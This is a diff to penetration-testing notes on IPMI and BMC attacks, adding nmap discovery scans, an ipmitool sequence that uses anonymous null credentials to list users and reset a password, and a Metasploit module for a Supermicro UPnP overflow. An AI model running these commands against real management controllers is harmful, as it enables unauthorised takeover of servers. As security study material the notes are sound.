@@ -10,9 +10,11 @@ tags:
   - bcm
 ---
 
-# 623 - Intelligent Platform Management Interface (IPMI)
+# Ports 623, 1900 - Intelligent Platform Management Interface (IPMI)
 
-Intelligent Platform Management Interface (IPMI) is a system management tool that provides sysadmins with the ability to manage and monitor systems even if they are powered off or in an unresponsive state.  It operates using a direct network connection to the system's hardware and does not require access to the operating system via a login shell. IPMI can also be used for remote upgrades to systems without requiring physical access to the target host. IPMI communicates over port 623 UDP. IPMI is typically used in three ways:
+Intelligent Platform Management Interface (IPMI) is a system management tool that provides sysadmins with the ability to manage and monitor systems even if they are powered off or in an unresponsive state.  It operates using a direct network connection to the system's hardware and does not require access to the operating system via a login shell. IPMI can also be used for remote upgrades to systems without requiring physical access to the target host. 
+
+**Default Port**: 623/UDP/TCP (It's usually on UDP but it could also be running on TCP). PMI is typically used in three ways:
 
 - Before the OS has booted to modify BIOS settings
 - When the host is fully powered down
@@ -27,15 +29,19 @@ Many Baseboard Management Controllers (BMCs) (including HP iLO, Dell DRAC, and S
 ### Discovery
 
 ```bash
-nmap -n -p 623 10.0.0./24
-nmap -n-sU -p 623 10.0.0./24
+nmap -n -p 623 $ip/24
+nmap -n -sU -p 623 $ip/24
+
+#run all nmap scripts related to ipmi protocol
+sudo nmap -sU --script ipmi* -p 623 $ip
+
 use  auxiliary/scanner/ipmi/ipmi_version
 ```
 
 ### Version
 
 ```shell-session
- sudo nmap -sU --script ipmi-version -p 623 <hostname/IP>
+sudo nmap -sU --script ipmi-version -p 623 $ip
 ```
 
 Metasploit scanner module [IPMI Information Discovery (auxiliary/scanner/ipmi/ipmi_version)](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_version/): this module discovers host information through IPMI Channel Auth probes:
@@ -113,6 +119,23 @@ hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
 ```
 
 
+### IPMI Anonymous Authentication
+
+A default configuration in many BMCs allows "anonymous" access, characterized by null username and password strings. This configuration can be exploited to reset passwords of named user accounts using `ipmitool`:
+
+```
+ipmitool -I lanplus -H $ip -U '' -P '' user list
+ipmitool -I lanplus -H $ip -U '' -P '' user set password 2 newpassword
+```
+
+
+### Supermicro IPMI Clear-text Passwords
+
+Supermicro's inclusion of a UPnP SSDP listener in its IPMI firmware, particularly on UDP port 1900, introduces a severe security risk. Vulnerabilities in the Intel SDK for UPnP Devices version 1.3.1, as detailed by [Rapid7's disclosure](https://blog.rapid7.com/2013/01/29/security-flaws-in-universal-plug-and-play-unplug-dont-play), allow for root access to the BMC:
+
+```
+msf> use exploit/multi/upnp/libupnp_ssdp_overflow
+```
 
 ## How does IPMI work
 
@@ -129,7 +152,7 @@ Systems using IPMI version 2.0 can be administered via serial over LAN, giving s
 
 **Baseboard Management Controllers (BMCs)**: Systems that use the IPMI protocol.
 
->BMCs are built into many motherboards but can also be added to a system as a PCI card. Most servers either come with a BMC or support adding a BMC. The most common BMCs we often see during internal penetration tests are HP iLO, Dell DRAC, and Supermicro IPMI.
+>BMCs are built into many motherboards but can also be added to a system as a PCI card (Peripheral Component Interconnect (_PCI_) is a local computer bus for attaching hardware devices in a computer and is part of the _PCI_ Local Bus standard.) Most servers either come with a BMC or support adding a BMC. The most common BMCs we often see during internal penetration tests are HP iLO, Dell DRAC, and Supermicro IPMI.
 
 If we can access a BMC during an assessment, we would gain full access to the host motherboard and be able to monitor, reboot, power off, or even reinstall the host operating system. Gaining access to a BMC is nearly equivalent to physical access to a system.
 
